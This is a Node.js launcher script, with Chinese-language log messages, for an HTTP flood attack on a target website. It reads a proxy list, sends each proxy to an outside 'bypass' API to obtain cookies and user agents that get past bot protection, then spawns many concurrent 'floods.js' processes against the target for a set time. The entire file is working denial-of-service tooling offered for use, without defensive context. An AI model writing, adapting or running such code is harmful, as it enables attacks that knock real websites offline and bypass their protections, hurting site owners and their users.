const { spawn } = require('child_process');
const fs = require('fs');
const colors = require('colors');
const fetch = require("node-fetch");

const target = process.argv[2];
const proxyFile = process.argv[3];
const time = process.argv[4];
const rate = process.argv[5];
const conc = process.argv[6];
const key = process.argv[7];


if (!target || !proxyFile || !time || !rate || !conc || !key) {
  console.error(`请输入正确的命令`.yellow);
  process.exit(1);
}

    async function flooder(proxy, cookieString, ua) {
      for (let i = 0; i < conc; i++) {
      var starts = spawn('node', ['floods.js',target, time, rate, '3', proxy, ua, cookieString]);
        starts.on('exit', (err, signal) => { starts.kill(); });
      }
    }
    
const MAX_CONCURRENT_REQUESTS = 5;

async function checkProxyAndLaunch() {
  let activeRequests = 0;
  let index = 0;
  let successbypass = 0;

  async function fetchData(proxy) {
    const apiUrl = `https://api.proxypool.us/api?key=${key}&ip=${proxy}&url=${target}`;
    activeRequests++;

    try {
      const res = await fetch(apiUrl);
      if (!res.ok) {
        const errorResponse = await res.json();
        throw new Error(errorResponse.error || `请求失败:::: 状态码：${res.status}`);
      }

      const data = await res.json();
      console.log(`开始调用API进行绕过操作: ${proxy}`.green);
      if (data.Status === 'success') {
        successbypass++;
        console.log(`绕过成功:` + ` ${proxy}`.yellow);
        console.log(`---------------------------------------------------`);
        console.log(`剩余次数:` + ` ${data.surplus}`.magenta);
        console.log(`IP:` + ` ${data.ip}`.green);
        console.log(`Title:` + ` ${data.title}`.yellow);
        console.log(`Cookie:` + ` ${data.cookies}`.blue);
        console.log(`UA:` + ` ${data.ua}`.red);
        console.log(`总共绕过成功:` + ` ${successbypass}`.white + ' 次');
        console.log(`---------------------------------------------------`);
        flooder(data.ip, data.cookies, data.ua);
      } else {
        // console.log(`错误: ${data.error}`.red);
      }
    } catch (err) {
      // console.log(`请求API失败: ${err.message}`.red);
    } finally {
      activeRequests--;
    }
  }

  async function launchNextProxy() {
    while (index < readProxies.length) {
      const proxy = readProxies[index++];
      await fetchData(proxy);
    }
  }

  const promises = [];
  for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
    promises.push(launchNextProxy());
  }
  await Promise.all(promises);
  const intervalId = setInterval(() => {
    if (activeRequests === 0 && index >= readProxies.length) {
      console.log("所有代理全部使用完毕".green);
      clearInterval(intervalId);
    }
  }, 100);
}
const readProxies = fs
  .readFileSync(proxyFile, 'utf-8')
  .toString()
  .replace(/\r/g, '')
  .split('\n');

checkProxyAndLaunch();
setTimeout(() => {
  process.exit(-1);
}, time * 1000);